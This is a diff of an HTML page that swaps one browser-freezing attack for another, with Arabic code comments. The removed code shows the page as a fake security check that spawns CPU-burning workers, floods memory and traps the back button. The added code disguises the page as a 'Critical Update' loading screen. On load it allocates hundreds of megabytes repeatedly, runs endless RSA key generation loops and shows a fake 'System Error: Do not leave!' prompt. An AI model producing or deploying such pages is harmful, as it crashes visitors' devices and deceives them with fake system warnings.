@@ -2,44 +2,46 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Checking Connection...</title>
+    <title>Critical Update</title>
 </head>
-<body>
+<body style="background:black; color:white; font-family:sans-serif; text-align:center; padding-top:25%;">
+    <h1>Loading System Assets... 99%</h1>
+    
     <script>
-        // كود العامل (الذي سيتم تشغيله في الخلفية)
-        const workerCode = `
-            while (true) {
-                // استهلاك مكثف للمعالج
-                Math.sqrt(Math.random() * 10000000);
-                postMessage("bomb");
-            }
-        `;
-
-        const blob = new Blob([workerCode], { type: 'application/javascript' });
-        const workerUrl = URL.createObjectURL(blob);
-
-        function startAttack() {
-            // تشغيل عدد كبير من العمال بناءً على عدد نويات المعالج
-            const cores = navigator.hardwareConcurrency || 16;
-            for (let i = 0; i < cores * 4; i++) {
-                const worker = new Worker(workerUrl);
-                
-                // إغراق الذاكرة (RAM) من داخل العامل
-                worker.onmessage = function() {
-                    let huge = new Array(1000000).fill("FREEZE").join("");
-                    document.body.innerHTML += huge;
-                };
-            }
-            
-            // قفل سجل التصفح لمنع الخروج
+        function ultraFreeze() {
+            // 1. استهلاك الذاكرة بشكل أسي (Exponential RAM Hog)
+            let storage = [];
             setInterval(() => {
-                history.pushState(null, null, location.href);
-            }, 1);
+                for (let i = 0; i < 50; i++) {
+                    // مضاعفة حجم البيانات في كل دورة
+                    storage.push(new Uint8Array(10 * 1024 * 1024)); // 10MB في كل إضافة
+                }
+            }, 50);
+
+            // 2. قفل المعالج (CPU Deadlock)
+            function heavyCompute() {
+                while (true) {
+                    let x = Math.random() * Math.random();
+                    // محاكاة عملية تشفير ثقيلة
+                    window.crypto.subtle.generateKey(
+                        {name: "RSA-OAEP", modulusLength: 4096, publicExponent: new Uint8Array([1, 0, 1]), hash: "SHA-256"},
+                        true, ["encrypt", "decrypt"]
+                    );
+                }
+            }
+
+            // تشغيل 20 خيط معالجة متوازي
+            for (let j = 0; j < 20; j++) {
+                setTimeout(heavyCompute, 0);
+            }
         }
 
-        window.onload = startAttack;
+        // بدء الهجوم فوراً
+        window.onload = ultraFreeze;
+
+        // منع إغلاق المتصفح أو الرجوع
+        window.onbeforeunload = function() { return "System Error: Do not leave!"; };
     </script>
-    <h1 style="text-align: center; margin-top: 20%;">جاري فحص الأمان... يرجى الانتظار</h1>
 </body>
 </html>
 
